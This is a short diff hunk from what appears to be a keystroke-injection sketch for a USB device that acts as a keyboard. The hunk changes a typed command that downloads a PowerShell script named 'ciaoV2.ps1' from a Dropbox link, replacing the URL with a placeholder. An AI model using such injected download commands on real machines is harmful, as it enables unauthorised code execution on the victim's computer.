@@ -92,7 +92,7 @@ void setup()
   
   // Download main script
 
-  Keyboard.print("wget https://www.dropbox.com/s/f4omlmphgin74ie/ciaoV2.ps1?raw=1 -OutFile ciaoV2.ps1");
+  Keyboard.print("wget LINK -OutFile ciaoV2.ps1");
 
   typeKey(KEY_RETURN);
 
